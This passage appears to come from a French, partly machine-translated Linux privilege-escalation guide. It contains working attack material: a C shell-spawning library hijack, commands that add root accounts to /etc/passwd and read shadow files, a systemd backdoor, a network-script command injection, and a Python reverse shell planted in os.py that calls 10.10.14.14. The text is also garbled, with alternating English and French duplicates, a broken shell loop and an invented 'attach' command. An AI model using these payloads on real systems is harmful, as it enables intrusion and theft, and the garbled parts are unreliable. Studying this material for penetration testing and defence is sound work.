#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacités

Les capacités Linux fournissent à un processus **un sous-ensemble des privilèges root disponibles**. Cela divise efficacement les privilèges root en unités plus petites et distinctes. Chacune de ces unités peut ensuite être accordée indépendamment aux processus. De cette manière, l'ensemble complet des privilèges est réduit, ce qui diminue les risques d'exploitation.\
Lisez la page suivante pour **en savoir plus sur les capacités et comment les abuser** :

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Autorisations de répertoire

Dans un répertoire, le **bit "exécution"** implique que l'utilisateur concerné peut y effectuer une commande "**cd**".\
Le bit **"lecture"** implique que l'utilisateur peut **lister** les **fichiers**, et le bit **"écriture"** implique que l'utilisateur peut **supprimer** et **créer** de nouveaux **fichiers**.

## ACLs

Les ACL (Access Control Lists) sont le deuxième niveau de permissions discrétionnaires, qui **peuvent remplacer les permissions standard ugo/rwx**. Lorsqu'ils sont utilisés correctement, ils peuvent vous accorder une **meilleure granularité pour définir l'accès à un fichier ou à un répertoire**, par exemple en donnant ou en refusant l'accès à un utilisateur spécifique qui n'est ni le propriétaire du fichier ni le propriétaire du groupe (à partir de [**ici**](https://linuxconfig.org/how-to-manage-acls-on-linux)).\
**Donnez** à l'utilisateur "kali" les permissions de lecture et d'écriture sur un fichier :
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtenir** les fichiers avec des ACL spécifiques du système:

```bash
find / -type f -exec getfacl {} + | grep "specific_acl"
```

Ce commandement recherche tous les fichiers du système et exécute la commande `getfacl` pour obtenir les listes de contrôle d'accès (ACL) de chaque fichier. Ensuite, la sortie est filtrée pour afficher uniquement les fichiers avec l'ACL spécifique recherchée.
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sessions de shell ouvertes

Dans les **anciennes versions**, vous pouvez **détourner** une session de **shell** d'un autre utilisateur (**root**).\
Dans les **versions les plus récentes**, vous pourrez **vous connecter** uniquement aux sessions de screen de **votre propre utilisateur**. Cependant, vous pourriez trouver des **informations intéressantes à l'intérieur de la session**.

### Détournement de sessions de screen

**Lister les sessions de screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**Se connecter à une session**

Lorsque vous effectuez une élévation de privilèges sur un système Linux, il peut être utile de vous connecter à une session existante pour obtenir un accès plus élevé. Cela peut être particulièrement utile si vous avez déjà compromis un compte utilisateur avec des privilèges limités et que vous souhaitez passer à un compte avec des privilèges plus élevés.

Pour vous connecter à une session existante, vous pouvez utiliser la commande `attach` dans le terminal. Cette commande vous permet de vous connecter à une session en cours d'exécution en tant qu'utilisateur root ou en tant qu'utilisateur avec des privilèges élevés.

Voici comment utiliser la commande `attach` :

```
attach <PID>
```

Remplacez `<PID>` par l'identifiant du processus de la session à laquelle vous souhaitez vous connecter. Vous pouvez obtenir l'identifiant du processus en utilisant la commande `ps` ou en utilisant d'autres outils de surveillance du système.

Une fois que vous avez exécuté la commande `attach`, vous serez connecté à la session en cours d'exécution en tant qu'utilisateur avec des privilèges élevés. Cela vous permettra d'exécuter des commandes avec des privilèges plus élevés et d'accéder à des ressources système qui ne sont pas accessibles aux utilisateurs avec des privilèges limités.

Il est important de noter que l'utilisation de la commande `attach` nécessite des privilèges élevés. Vous devez donc déjà avoir un accès avec des privilèges limités sur le système pour pouvoir l'utiliser.

La commande `attach` est un outil puissant pour effectuer une élévation de privilèges sur un système Linux. Cependant, il est important de l'utiliser avec précaution et de s'assurer d'avoir l'autorisation appropriée avant de l'utiliser.
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Piratage des sessions tmux

C'était un problème avec les **anciennes versions de tmux**. Je n'ai pas pu pirater une session tmux (v2.1) créée par root en tant qu'utilisateur non privilégié.

**Lister les sessions tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Se connecter à une session**

To escalate privileges on a Linux system, it is often necessary to gain access to an active user session. This can be achieved by attaching to an existing session using various techniques. Once attached, the attacker can execute commands with the privileges of the user whose session they have accessed.

There are several methods to attach to a session, depending on the specific scenario and the tools available. Some common techniques include:

1. **Screen**: The `screen` command allows users to create and manage multiple terminal sessions within a single SSH session. If an attacker can gain access to an active `screen` session, they can attach to it and execute commands as the user.

2. **tmux**: Similar to `screen`, `tmux` is a terminal multiplexer that allows users to create and manage multiple terminal sessions. If an attacker can attach to an active `tmux` session, they can execute commands with the user's privileges.

3. **SSH**: If the attacker has access to the SSH private key or password of a user with an active SSH session, they can use the `ssh` command to connect to the session and execute commands.

4. **VNC**: If the target system has a VNC server running and the attacker can obtain the VNC password or exploit a vulnerability to bypass authentication, they can connect to an active VNC session and execute commands.

5. **X11**: If the attacker has access to the X11 display of a user with an active X session, they can use tools like `xauth` or `xhost` to gain access to the session and execute commands.

It is important to note that attaching to a session requires some level of access to the target system. This could be achieved through various means, such as exploiting vulnerabilities, obtaining credentials, or leveraging social engineering techniques.
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Vérifiez **Valentine box from HTB** pour un exemple.

## SSH

### Debian OpenSSL PRNG prévisible - CVE-2008-0166

Toutes les clés SSL et SSH générées sur les systèmes basés sur Debian (Ubuntu, Kubuntu, etc.) entre septembre 2006 et le 13 mai 2008 peuvent être affectées par ce bogue.\
Ce bogue se produit lors de la création d'une nouvelle clé ssh dans ces systèmes d'exploitation, car **seules 32 768 variations étaient possibles**. Cela signifie que toutes les possibilités peuvent être calculées et **en ayant la clé publique ssh, vous pouvez rechercher la clé privée correspondante**. Vous pouvez trouver les possibilités calculées ici: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valeurs de configuration intéressantes pour SSH

* **PasswordAuthentication:** Spécifie si l'authentification par mot de passe est autorisée. La valeur par défaut est `no`.
* **PubkeyAuthentication:** Spécifie si l'authentification par clé publique est autorisée. La valeur par défaut est `yes`.
* **PermitEmptyPasswords**: Lorsque l'authentification par mot de passe est autorisée, spécifie si le serveur autorise la connexion aux comptes avec des chaînes de mot de passe vides. La valeur par défaut est `no`.

### PermitRootLogin

Spécifie si root peut se connecter via ssh, la valeur par défaut est `no`. Les valeurs possibles sont :

* `yes`: root peut se connecter en utilisant un mot de passe et une clé privée
* `without-password` ou `prohibit-password`: root ne peut se connecter qu'avec une clé privée
* `forced-commands-only`: Root ne peut se connecter qu'en utilisant une clé privée et si les options de commandes sont spécifiées
* `no` : non

### AuthorizedKeysFile

Spécifie les fichiers contenant les clés publiques pouvant être utilisées pour l'authentification de l'utilisateur. Il peut contenir des jetons comme `%h`, qui seront remplacés par le répertoire personnel. **Vous pouvez indiquer des chemins absolus** (commençant par `/`) ou **des chemins relatifs à partir du répertoire personnel de l'utilisateur**. Par exemple:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Cette configuration indiquera que si vous essayez de vous connecter avec la clé **privée** de l'utilisateur "**testusername**", SSH va comparer la clé publique de votre clé avec celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`.

### ForwardAgent/AllowAgentForwarding

L'agent SSH permet de **utiliser vos clés SSH locales au lieu de laisser des clés** (sans phrase de passe !) sur votre serveur. Ainsi, vous pourrez **sauter** via SSH **vers un hôte** et à partir de là, **sauter vers un autre** hôte **en utilisant** la **clé** située dans votre **hôte initial**.

Vous devez définir cette option dans `$HOME/.ssh.config` comme ceci :
```
Host example.com
ForwardAgent yes
```
Notez que si `Host` est `*`, chaque fois que l'utilisateur passe à une autre machine, cette machine pourra accéder aux clés (ce qui pose un problème de sécurité).

Le fichier `/etc/ssh_config` peut **outrepasser** ces **options** et autoriser ou refuser cette configuration.\
Le fichier `/etc/sshd_config` peut **autoriser** ou **refuser** la transmission de l'agent SSH avec le mot-clé `AllowAgentForwarding` (par défaut, c'est autorisé).

Si vous constatez que l'Agent Forward est configuré dans un environnement, lisez la page suivante car **vous pourriez l'exploiter pour escalader les privilèges** :

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Fichiers intéressants

### Fichiers de profil

Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont des **scripts qui sont exécutés lorsqu'un utilisateur lance un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l'un d'entre eux, vous pouvez escalader les privilèges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil étrange est trouvé, vous devriez le vérifier pour **des informations sensibles**.

### Fichiers Passwd/Shadow

Selon le système d'exploitation, les fichiers `/etc/passwd` et `/etc/shadow` peuvent avoir un nom différent ou il peut y avoir une sauvegarde. Il est donc recommandé de **les trouver tous** et de **vérifier si vous pouvez les lire** pour voir **s'il y a des hachages** à l'intérieur des fichiers :
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Dans certaines occasions, vous pouvez trouver des **hachages de mots de passe** à l'intérieur du fichier `/etc/passwd` (ou équivalent).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd modifiable

Tout d'abord, générer un mot de passe avec l'une des commandes suivantes.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ensuite, ajoutez l'utilisateur `hacker` et ajoutez le mot de passe généré.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Alternativement, vous pouvez utiliser les lignes suivantes pour ajouter un utilisateur fictif sans mot de passe.\
AVERTISSEMENT: vous pourriez compromettre la sécurité actuelle de la machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: Sur les plateformes BSD, `/etc/passwd` se trouve à `/etc/pwd.db` et `/etc/master.passwd`, et `/etc/shadow` est renommé en `/etc/spwd.db`.

Vous devriez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration de service** ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/**, vous pouvez alors modifier les lignes suivantes :
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Votre porte dérobée sera exécutée la prochaine fois que Tomcat sera démarré.

### Vérifier les dossiers

Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Vous ne pourrez probablement pas lire le dernier, mais essayez).
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Emplacement étrange/Fichiers possédés

---

#### Description

This technique involves searching for files in unusual locations or files that are owned by privileged users. These files may contain sensitive information or provide a means for privilege escalation.

#### Vulnerability

If a file is located in an unexpected directory or is owned by a privileged user, it may indicate a misconfiguration or a security vulnerability. Attackers can exploit this by gaining access to sensitive data or escalating their privileges.

#### Exploitation

1. Identify unusual file locations or files owned by privileged users.
2. Determine the permissions and access level of these files.
3. Exploit the vulnerability by accessing or modifying the files to gain unauthorized privileges or extract sensitive information.

#### Mitigation

To mitigate the risk of privilege escalation through weird location/owned files, follow these best practices:

- Regularly review file permissions and ownership to ensure they are appropriate.
- Monitor file system changes and log any suspicious activity.
- Implement access controls and restrict file access to authorized users only.
- Use file integrity monitoring tools to detect unauthorized modifications.
- Keep software and systems up to date to prevent known vulnerabilities from being exploited.

---

#### Résumé

Cette technique consiste à rechercher des fichiers dans des emplacements inhabituels ou des fichiers appartenant à des utilisateurs privilégiés. Ces fichiers peuvent contenir des informations sensibles ou offrir un moyen d'escalade de privilèges.

#### Vulnérabilité

Si un fichier est situé dans un répertoire inattendu ou appartient à un utilisateur privilégié, cela peut indiquer une mauvaise configuration ou une vulnérabilité de sécurité. Les attaquants peuvent exploiter cela en accédant à des données sensibles ou en escaladant leurs privilèges.

#### Exploitation

1. Identifier les emplacements de fichiers inhabituels ou les fichiers appartenant à des utilisateurs privilégiés.
2. Déterminer les autorisations et le niveau d'accès de ces fichiers.
3. Exploiter la vulnérabilité en accédant ou en modifiant les fichiers pour obtenir des privilèges non autorisés ou extraire des informations sensibles.

#### Atténuation

Pour atténuer le risque d'escalade de privilèges via des fichiers dans des emplacements étranges ou appartenant à des utilisateurs privilégiés, suivez ces bonnes pratiques :

- Vérifiez régulièrement les autorisations et la propriété des fichiers pour vous assurer qu'ils sont appropriés.
- Surveillez les modifications du système de fichiers et enregistrez toute activité suspecte.
- Mettez en place des contrôles d'accès et restreignez l'accès aux fichiers aux seuls utilisateurs autorisés.
- Utilisez des outils de surveillance de l'intégrité des fichiers pour détecter les modifications non autorisées.
- Maintenez à jour les logiciels et les systèmes pour éviter l'exploitation de vulnérabilités connues.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Fichiers modifiés dans les dernières minutes

To identify recently modified files on a Linux system, you can use the `find` command with the `-mmin` option. This allows you to search for files that have been modified within a specified number of minutes.

Here is the command syntax:

```bash
find / -type f -mmin -N
```

Replace `/` with the directory you want to search in, and replace `N` with the number of minutes. This command will search for regular files (`-type f`) that have been modified within the last `N` minutes.

For example, to find files modified within the last 5 minutes in the entire system, you can use:

```bash
find / -type f -mmin -5
```

This will display a list of files that have been modified within the last 5 minutes.

Keep in mind that searching the entire system can be time-consuming, so it's recommended to narrow down the search to specific directories if possible.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Fichiers de base de données Sqlite

Sqlite est un système de gestion de base de données relationnelle qui stocke les données dans des fichiers. Ces fichiers de base de données peuvent contenir des informations sensibles et sont souvent utilisés par les applications pour stocker des données utilisateur.

Lors de l'analyse d'une application, il est important de rechercher les fichiers de base de données Sqlite, car ils peuvent contenir des informations précieuses pour une élévation de privilèges. Les fichiers de base de données Sqlite peuvent contenir des tables, des colonnes et des enregistrements qui peuvent être exploités pour obtenir des privilèges supplémentaires.

Pour rechercher ces fichiers, vous pouvez utiliser des outils tels que `find` ou `locate` sur les systèmes Linux. Une fois que vous avez localisé les fichiers de base de données Sqlite, vous pouvez les examiner à l'aide d'un outil tel que `sqlite3` pour extraire les informations nécessaires.

Il est important de noter que l'accès aux fichiers de base de données Sqlite peut nécessiter des privilèges élevés. Par conséquent, il est essentiel de disposer des autorisations appropriées pour accéder à ces fichiers lors de l'analyse d'une application.
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### Fichiers \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Fichiers cachés

Hidden files, as the name suggests, are files that are not visible by default in a file manager or command line interface. These files are often used to store sensitive information or configuration settings that should not be easily accessible to regular users.

In Linux, hidden files are denoted by a dot (.) at the beginning of the file name. For example, a file named ".config" would be considered hidden. To view hidden files in a file manager, you can usually enable an option to show hidden files. In a command line interface, you can use the "ls -a" command to display all files, including hidden ones.

Hidden files can be used by attackers to hide malicious scripts or backdoor access to a system. Therefore, it is important to regularly check for and remove any suspicious hidden files. Additionally, it is recommended to restrict access to sensitive files and directories to prevent unauthorized users from accessing them.

By understanding how hidden files work and being vigilant in their detection, you can enhance the security of your Linux system.
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binaires dans le PATH**

Lorsque vous effectuez une élévation de privilèges sur un système Linux, il est important de vérifier les scripts et les binaires qui se trouvent dans le PATH. Le PATH est une variable d'environnement qui spécifie les répertoires dans lesquels le système recherche les exécutables lorsqu'une commande est saisie.

Les scripts et les binaires dans le PATH peuvent être utilisés pour exécuter des commandes avec des privilèges élevés. Par conséquent, si vous trouvez un script ou un binaire vulnérable dans le PATH, vous pouvez l'exploiter pour obtenir des privilèges supplémentaires.

Pour vérifier les scripts et les binaires dans le PATH, vous pouvez utiliser la commande suivante :

```bash
echo $PATH
```

Cela affichera les répertoires dans le PATH. Vous pouvez ensuite parcourir ces répertoires pour rechercher des scripts ou des binaires vulnérables.

Une fois que vous avez identifié un script ou un binaire vulnérable, vous pouvez l'exploiter en utilisant différentes techniques d'élévation de privilèges, telles que l'injection de code, la substitution de fichiers ou l'exploitation de vulnérabilités connues.

Il est également important de noter que les scripts et les binaires dans le PATH peuvent être modifiés par des utilisateurs malveillants pour exécuter des commandes malveillantes. Par conséquent, il est recommandé de limiter les droits d'accès aux répertoires du PATH et de surveiller les modifications apportées à ces répertoires.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Fichiers Web**

Web files are an essential part of any web application. They contain the code, scripts, and other resources that make up the website. However, if not properly secured, these files can become a potential vulnerability that can be exploited by attackers.

Les fichiers Web sont une partie essentielle de toute application Web. Ils contiennent le code, les scripts et autres ressources qui composent le site Web. Cependant, s'ils ne sont pas correctement sécurisés, ces fichiers peuvent devenir une vulnérabilité potentielle qui peut être exploitée par des attaquants.

Attackers can gain unauthorized access to web files through various means, such as directory traversal, file inclusion vulnerabilities, or misconfigured permissions. Once they have access to these files, they can modify or delete them, potentially causing damage to the website or even gaining further access to the underlying server.

Les attaquants peuvent accéder de manière non autorisée aux fichiers Web par divers moyens, tels que la traversée de répertoire, les vulnérabilités d'inclusion de fichiers ou les autorisations mal configurées. Une fois qu'ils ont accès à ces fichiers, ils peuvent les modifier ou les supprimer, ce qui peut potentiellement causer des dommages au site Web ou même leur permettre d'accéder davantage au serveur sous-jacent.

To prevent unauthorized access to web files, it is important to follow security best practices such as:

Pour empêcher l'accès non autorisé aux fichiers Web, il est important de suivre les meilleures pratiques de sécurité, telles que :

- **Secure file permissions**: Ensure that the web files have the appropriate permissions set. Restrict access to sensitive files and directories to only those who need it.

- **Permissions de fichier sécurisées** : Veillez à ce que les fichiers Web aient les autorisations appropriées. Restreignez l'accès aux fichiers et répertoires sensibles uniquement à ceux qui en ont besoin.

- **Input validation**: Validate and sanitize user input to prevent common web vulnerabilities such as SQL injection or cross-site scripting (XSS).

- **Validation des entrées** : Validez et nettoyez les entrées utilisateur pour éviter les vulnérabilités Web courantes telles que l'injection SQL ou les attaques de script intersite (XSS).

- **Regular updates**: Keep the web application and its dependencies up to date with the latest security patches. Vulnerabilities in outdated software can be exploited by attackers.

- **Mises à jour régulières** : Maintenez l'application Web et ses dépendances à jour avec les derniers correctifs de sécurité. Les vulnérabilités dans les logiciels obsolètes peuvent être exploitées par des attaquants.

By implementing these security measures, you can significantly reduce the risk of unauthorized access to your web files and protect your web application from potential attacks.

En mettant en œuvre ces mesures de sécurité, vous pouvez réduire considérablement le risque d'accès non autorisé à vos fichiers Web et protéger votre application Web contre les attaques potentielles.
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sauvegardes**

Backups are an essential part of any system's security strategy. They serve as a safety net in case of data loss or system compromise. Regularly backing up your data ensures that you can recover it in the event of a disaster.

Les sauvegardes sont une partie essentielle de la stratégie de sécurité de tout système. Elles servent de filet de sécurité en cas de perte de données ou de compromission du système. Sauvegarder régulièrement vos données garantit que vous pourrez les récupérer en cas de catastrophe.

#### **Backup Best Practices**

#### **Meilleures pratiques de sauvegarde**

Here are some best practices to follow when implementing backups:

Voici quelques meilleures pratiques à suivre lors de la mise en place de sauvegardes :

- **Automate the process**: Manual backups are prone to errors and can be easily forgotten. Automating the backup process ensures that it is done consistently and reliably.

- **Automatiser le processus** : Les sauvegardes manuelles sont sujettes aux erreurs et peuvent être facilement oubliées. L'automatisation du processus de sauvegarde garantit qu'il est effectué de manière cohérente et fiable.

- **Use off-site storage**: Storing backups off-site protects them from physical damage or theft. Cloud storage or remote servers are good options for off-site storage.

- **Utiliser un stockage externe** : Stocker les sauvegardes en dehors du site les protège contre les dommages physiques ou le vol. Le stockage en nuage ou les serveurs distants sont de bonnes options pour le stockage externe.

- **Encrypt backups**: Encrypting backups ensures that even if they are accessed by unauthorized individuals, the data remains secure.

- **Chiffrer les sauvegardes** : Le chiffrement des sauvegardes garantit que même si elles sont consultées par des personnes non autorisées, les données restent sécurisées.

- **Test backups regularly**: Regularly testing backups ensures that they are valid and can be successfully restored when needed.

- **Tester régulièrement les sauvegardes** : Tester régulièrement les sauvegardes garantit qu'elles sont valides et peuvent être restaurées avec succès en cas de besoin.

- **Implement a retention policy**: Define a retention policy that specifies how long backups should be kept. This helps manage storage space and ensures compliance with data protection regulations.

- **Mettre en place une politique de conservation** : Définir une politique de conservation qui spécifie pendant combien de temps les sauvegardes doivent être conservées. Cela permet de gérer l'espace de stockage et garantit la conformité aux réglementations sur la protection des données.

By following these best practices, you can ensure that your backups are reliable, secure, and readily available when needed.

En suivant ces meilleures pratiques, vous pouvez vous assurer que vos sauvegardes sont fiables, sécurisées et disponibles en cas de besoin.
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Fichiers connus contenant des mots de passe

Lisez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), il recherche **plusieurs fichiers possibles qui pourraient contenir des mots de passe**.\
**Un autre outil intéressant** que vous pouvez utiliser à cet effet est : [**LaZagne**](https://github.com/AlessandroZ/LaZagne), une application open source utilisée pour récupérer de nombreux mots de passe stockés sur un ordinateur local pour Windows, Linux et Mac.

### Journaux

Si vous pouvez lire les journaux, vous pourrez peut-être trouver **des informations intéressantes/confidentielles à l'intérieur**. Plus le journal est étrange, plus il sera intéressant (probablement).\
De plus, certains journaux d'**audit mal configurés (avec une porte dérobée ?)** peuvent vous permettre d'**enregistrer des mots de passe** à l'intérieur des journaux d'audit, comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Pour **lire les journaux du groupe** [**adm**](interesting-groups-linux-pe/#groupe-adm), cela sera vraiment utile.

### Fichiers Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Recherche générique de mots de passe/Regex

Vous devriez également vérifier les fichiers contenant le mot "**password**" dans leur **nom** ou à l'intérieur du **contenu**, ainsi que vérifier les adresses IP et les emails dans les journaux, ou les expressions régulières de hachage.\
Je ne vais pas expliquer ici comment faire tout cela, mais si cela vous intéresse, vous pouvez consulter les dernières vérifications effectuées par [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Fichiers modifiables

### Piratage de bibliothèque Python

Si vous savez **d'où** un script Python va être exécuté et que vous **pouvez écrire à l'intérieur** de ce dossier ou que vous pouvez **modifier les bibliothèques Python**, vous pouvez modifier la bibliothèque OS et y ajouter une porte dérobée (si vous pouvez écrire là où le script Python va être exécuté, copiez et collez la bibliothèque os.py).

Pour **ajouter une porte dérobée à la bibliothèque**, ajoutez simplement à la fin de la bibliothèque os.py la ligne suivante (changez l'IP et le PORT) :
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploitation de Logrotate

Il existe une vulnérabilité dans `logrotate` qui permet à un utilisateur disposant de **permissions d'écriture sur un fichier journal** ou sur **l'un de ses répertoires parents** de faire en sorte que `logrotate` écrive **un fichier dans n'importe quel emplacement**. Si **logrotate** est exécuté par **root**, alors l'utilisateur pourra écrire n'importe quel fichier dans _**/etc/bash\_completion.d/**_ qui sera exécuté par n'importe quel utilisateur qui se connecte.\
Donc, si vous avez des **permissions d'écriture** sur un **fichier journal** ou sur l'un de ses **répertoires parents**, vous pouvez **élever vos privilèges** (sur la plupart des distributions Linux, logrotate est exécuté automatiquement une fois par jour en tant qu'utilisateur **root**). Vérifiez également si, en plus de _/var/log_, d'autres fichiers sont **rotatés**.

{% hint style="info" %}
Cette vulnérabilité affecte la version `3.18.0` et les versions antérieures de `logrotate`.
{% endhint %}

Des informations plus détaillées sur la vulnérabilité peuvent être trouvées sur cette page : [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).

Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(journaux nginx)**, donc chaque fois que vous constatez que vous pouvez modifier des journaux, vérifiez qui gère ces journaux et vérifiez si vous pouvez élever vos privilèges en remplaçant les journaux par des liens symboliques.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

Si, pour une raison quelconque, un utilisateur est capable d'**écrire** un script `ifcf-<quelquechose>` dans _/etc/sysconfig/network-scripts_ **ou** s'il peut **modifier** un script existant, alors votre **système est compromis**.

Les scripts réseau, par exemple _ifcg-eth0_, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont \~sourcés\~ sur Linux par Network Manager (dispatcher.d).

Dans mon cas, l'attribut `NAME=` de ces scripts réseau n'est pas géré correctement. Si vous avez des **espaces blancs dans le nom, le système essaie d'exécuter la partie après l'espace blanc**. Cela signifie que **tout ce qui suit le premier espace blanc est exécuté en tant que root**.

Par exemple : _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
**Référence de vulnérabilité:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init, init.d, systemd et rc.d**

